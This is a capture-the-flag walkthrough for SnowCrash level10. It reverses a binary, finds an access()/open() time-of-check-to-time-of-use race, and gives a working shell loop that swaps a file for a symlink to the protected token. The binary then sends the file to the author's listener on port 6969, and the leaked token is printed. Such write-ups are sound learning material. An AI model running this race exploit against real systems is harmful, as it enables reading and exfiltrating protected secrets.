In level 10, we once again have an executable and a token file that we can't read

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it

level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

level10 program is used to send a file to which we have access to an host, so shouldn't really help for the token file as we don't have access to it

when using `strings -d level 10`, we see the following lines

```
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
```

which means that the program tries to connect on port 6969

```bash
level10@SnowCrash:~$ ./level10 /tmp/test localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
level10@SnowCrash:~$ ./level10 /tmp/test 192.168.56.102
Connecting to 192.168.56.102:6969 .. Unable to connect to host 192.168.56.102
```

we develop a small program in python in order to have a server listening on port 6969
We test it with a file /tmp/test2 that contains lol and from out vm we use the command
```bash
level10@SnowCrash:~$ ./level10 /tmp/test2 192.168.56.1
Connecting to 192.168.56.1:6969 .. Connected!
Sending file .. wrote file!
```

so the file is wrote and sent, and with our server program, we receive the message
```bash
resources git:(main) ✗ python simple_server.py
Server listening on port 6969
Message received: .*( )*.

Message received: lol
```

So we can receive the content of a file, now we need to find a way to send the content of token while we don't have access to the file

using nm, we can see that the program use access, most likely to check that we have access to the file we are trying to send before opening it.
As a result, the program might be susceptible to a tocttou attack : https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

We can for instance create a file that we own, and after the check, replace it by a symlink to the tocken file
For that we create the following script in /tmp/exploit.sh
```bash
#!/bin/sh 
while [ true ]; do 
rm /tmp/test; 
echo "trying" > /tmp/test 
/home/user/level10/level10 /tmp/test 192.168.56.1 &
ln -s -f /home/user/level10/token /tmp/test & 
done
```
this script will run an infinite loop that will remove our owned file /tmp/test, recreate it containing trying
and then will in parallel execute the level10 program on the /tmp/test file
and create a symbolic link to the token file in /tmp/test

then we let our script run (bash /tmp/exploit.sh) and after some time on our server program:
```
resources git:(main) ✗ python simple_server.py
Server listening on port 6969
Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: .*( )*.
trying

Message received: woupa2yuojeeaaed06riuj63c
``` 

we finally manage to receive the token !!!
we now only have to connect and get our flag with the getflag program